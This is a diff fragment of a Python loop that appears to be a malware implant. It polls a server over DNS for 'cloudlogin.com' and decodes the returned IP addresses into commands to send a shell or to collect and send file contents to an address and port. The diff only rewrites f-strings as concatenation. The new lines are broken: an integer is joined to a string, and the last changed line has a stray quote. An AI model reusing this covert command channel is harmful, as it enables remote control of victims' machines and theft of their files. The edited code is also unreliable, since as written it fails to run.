@@ -105,7 +105,7 @@ while True:
             port = int(portIPSplit[0]) + int(portIPSplit[1])
             
             if not ((address == "100.100.100.100") and (port == 100)):
-                print(f"Sending shell to {address}:{port}") 
+                print("Sending shell to " + address + ":" + port) 
         elif(ipSplit[3] == "85"): 
             print("Collecting file contents")
             
@@ -117,7 +117,7 @@ while True:
             if not ((len(ips) == 1) and ((ips[0].split('.'))[3] == "100")):
                 fileName = resolveFileName(ips)
                 
-            print(f"Accessing file: {fileName}")
+            print("Accessing file: " + fileName)
             
             sock.sendto(makeQuery("cloudlogin.com"), (SERVER, 53)) #ip of 100.100.100.100 with port 100 signals an error, stop process and sleep
             resp, _ = sock.recvfrom(512)
@@ -131,6 +131,6 @@ while True:
             port = int(portIPSplit[0]) + int(portIPSplit[1])
             
             if not ((address == "100.100.100.100") and (port == 100)):
-                print(f"Sending file contents to {address}:{port}") 
+                print("Sending file contents to " + address + ":" + port") 
             
     time.sleep(WAIT_TIME)
